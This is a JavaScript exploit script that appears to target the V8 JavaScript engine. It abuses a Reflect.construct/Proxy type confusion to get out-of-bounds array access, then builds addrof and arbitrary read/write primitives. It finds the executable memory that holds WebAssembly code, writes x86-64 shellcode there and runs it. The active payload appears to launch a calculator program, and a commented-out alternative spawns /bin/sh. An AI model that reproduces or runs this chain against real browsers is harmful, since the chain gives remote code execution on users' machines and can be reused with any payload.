var FormatBuffer = function(){
  this.buffer = new ArrayBuffer(8);
  this.u8 = new Uint8Array(this.buffer);
  this.u32 = new Uint32Array(this.buffer);
  this.f64 = new Float64Array(this.buffer);
  this.BASE = 0x100000000;
};
let fbuf = new FormatBuffer();
var i2f = function(i){
  fbuf.u32[0] = i%fbuf.BASE;
  fbuf.u32[1] = i/fbuf.BASE;
  return fbuf.f64[0];
};

var f2i = function(f){
  fbuf.f64[0] = f;
  return fbuf.u32[0] + fbuf.BASE*fbuf.u32[1]; 
};

var hex = function(x){
  if (x < 0)
    return `-${hex(-x)}`;
  return `0x${x.toString(16)}`;
};

//==================================================================================================================
const MAX_ITERATIONS = 0x10000;

let vulnArray = [0.1,,,,,,,,,,,,,,,,,,,,,,, 6.1, 7.1, 8.1];
var oobArray;
var uint64Array;
var objLeaker;
var real_external_ptr;
vulnArray.pop();
vulnArray.pop();
vulnArray.pop();
function empty() {}

function f(nt) {
  vulnArray.push(typeof(Reflect.construct(empty, arguments, nt)) === Proxy ? 0.2 : 1.012e-320);
  if(nt === p){
    //%DebugPrint(vulnArray);
    //%DebugPrint(oobArray); // 0x25af08086fd4 + 1 ; oobArray[0]
    //%DebugPrint(uint64Array); // 0x25af0808706c + 1 ; oobArray[23] -> uint64Array.external_ptr 
                                                  //  oobArray[24] -> uint64Array.base_ptr
    //%DebugPrint(objLeaker); // 0x25af080870b0 + 1 ; oobArray[28] -> objLeaker.(padding, leakPoint)
    real_external_ptr = f2i(oobArray[23]) - 7;
  }
  for (let i=0; i<MAX_ITERATIONS; i++) {};
}
let p = new Proxy(Object, {
  get: function() {
    vulnArray[0] = {};
    oobArray = [0.2, 1.2, 2.2, 3.2, 4.3];
    uint64Array = new BigUint64Array(4);
    objLeaker = {
      padding : {},
      leakPoint : {}
    };
    
    return Object.prototype;
  }
});
function main(o) {
  for (let i=0; i<MAX_ITERATIONS; i++) {};
  return f(o);
}

for (let i=0; i<MAX_ITERATIONS; i++) {
  empty();
};
main(empty);
main(empty);
main(p);

var addrof = function(obj) {
  objLeaker.leakPoint = obj;
  return (f2i(oobArray[28]) / 0x100000000) & 0xffffffff;
};

var ab_write;
var read64;
var oob_open;
var oob_close;

//For writing shellcode
var uint8Array = new Uint8Array(0x100);
uint8Array_addr = addrof(uint8Array) + real_external_ptr - 1;
//For reading object base_ptr
var uint32Array = new Uint32Array(0x100);
uint32Array_addr = addrof(uint32Array) + real_external_ptr - 1;
//For setting oobArray.length
var oob_triger = new Uint32Array(0x100);
oob_triger_addr = addrof(oob_triger) + real_external_ptr - 1;

uint64Array_addr = addrof(uint64Array) + real_external_ptr - 1;
oobArray_addr = addrof(oobArray) + real_external_ptr - 1;

//oobArray_addr + 4*3 -> oobArray.length
console.log("[*] oobArray address: "+hex(oobArray_addr));

//Passing a number address
//Return bigint
read64 = function(addr){

  let old_e_ptr = oobArray[23];
  let old_b_ptr = oobArray[24];

  oobArray[23] = i2f(addr);
  oobArray[24] = 0.0;
  let result = uint64Array[0]

  oobArray[23] = old_e_ptr;
  oobArray[24] = old_b_ptr;

  return result;
};

//Passing a number address
ab_write = function(addr, content){

  if(typeof content == "bigint"){
    let old_e_ptr = oobArray[23];
    let old_b_ptr = oobArray[24];

    oobArray[23] = i2f(addr);
    oobArray[24] = 0.0;
    uint64Array[0] = content;
    oobArray[23] = old_e_ptr;
    oobArray[24] = old_b_ptr;
  }else if(typeof content == "string"){

    let old_e_ptr = read64(uint8Array_addr + 8*5);
    let old_b_ptr = read64(uint8Array_addr + 8*6);

    ab_write(uint8Array_addr + 8*5, BigInt(addr));
    ab_write(uint8Array_addr + 8*6, 0n);

    oob_close();
    for(let i=0, len=content.length; i<len; i++){
      uint8Array[i] = content[i].charCodeAt();
    }

    ab_write(uint8Array_addr + 8*5, old_e_ptr);
    ab_write(uint8Array_addr + 8*6, old_b_ptr);
  }
};

var read32 = function(addr){

  ab_write(uint32Array_addr+8*5, BigInt(addr));
  return uint32Array[0];
}

var write32 = function(addr, content){
  ab_write(uint32Array_addr+8*5, BigInt(addr));
  uint32Array[0] = content;
}

ab_write(oob_triger_addr+8*5, BigInt(oobArray_addr+4*3));

oob_open = function(){
  oob_triger[0] = 0x400<<1;
};

oob_close = function(){
  oob_triger[0] = 0x5<<1;
};

var pwn = {

  get_wasm_func : function () {
    var importObject = {
        imports: { imported_func: arg => console.log(arg) }
    };
    bc = [0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x8, 0x2, 0x60, 0x1, 0x7f, 0x0, 0x60, 0x0, 0x0, 0x2, 0x19, 0x1, 0x7, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x73, 0xd, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x0, 0x3, 0x2, 0x1, 0x1, 0x7, 0x11, 0x1, 0xd, 0x65, 0x78, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x1, 0xa, 0x8, 0x1, 0x6, 0x0, 0x41, 0x2a, 0x10, 0x0, 0xb];
    wasm_code = new Uint8Array(bc);
    wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), importObject);
    return wasm_mod.exports.exported_func;
  },
  getRWXMem : function(){
      
    let wasm_func = this.get_wasm_func();
    wfunc = wasm_func;
  
    //  traverse the JSFunction object chain to find the RWX WebAssembly code page
    let wasm_func_addr = addrof(wasm_func) - 1 + real_external_ptr;
    let sfi = read32(wasm_func_addr + 4*3) - 1 + real_external_ptr;
    console.log('[*] sfi: ' + hex(sfi));
    let WasmExportedFunctionData = read32(sfi + 4*1) - 1 + real_external_ptr;
    console.log('[*] WasmExportedFunctionData: ' + hex(WasmExportedFunctionData));

    let instance = read32(WasmExportedFunctionData + 4*2) - 1 + real_external_ptr;
    console.log('[*] instance: ' + hex(instance));
    
    let rwx_addr = read32(instance + 4*0x1a) + read32(instance + 4*0x1a + 4)*0x100000000;
    console.log('[*] rwx_addr:  ' + hex(rwx_addr));
    
    return [wasm_func, rwx_addr];
  },
  start : function(){

    let shellcodeObj = this.getRWXMem();
    let shellcodeAddr = shellcodeObj[1];
    let shellcodeEntry = shellcodeObj[0];
    
    //let shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x48\x31\xc0\xb0\x3b\x99\x4d\x31\xd2\x0f\x05";
    let shellcode = "\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x79\x62\x60\x6d\x62\x01\x01\x48\x31\x04\x24\x48\xb8\x2f\x75\x73\x72\x2f\x62\x69\x6e\x50\x48\x89\xe7\x68\x3b\x31\x01\x01\x81\x34\x24\x01\x01\x01\x01\x48\xb8\x44\x49\x53\x50\x4c\x41\x59\x3d\x50\x31\xd2\x52\x6a\x08\x5a\x48\x01\xe2\x52\x48\x89\xe2\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x79\x62\x60\x6d\x62\x01\x01\x01\x48\x31\x04\x24\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x6a\x3b\x58\x0f\x05";
    
    console.log("[*] shellcode length: "+hex(shellcode.length));
    console.log("[*] Get RWX memory address : "+hex(shellcodeAddr));
    console.log("[*] Injecting shellcode");
    ab_write(shellcodeAddr, shellcode);
    console.log("[*] Remote code execute");
    
    shellcodeEntry();

  }

};

pwn.start();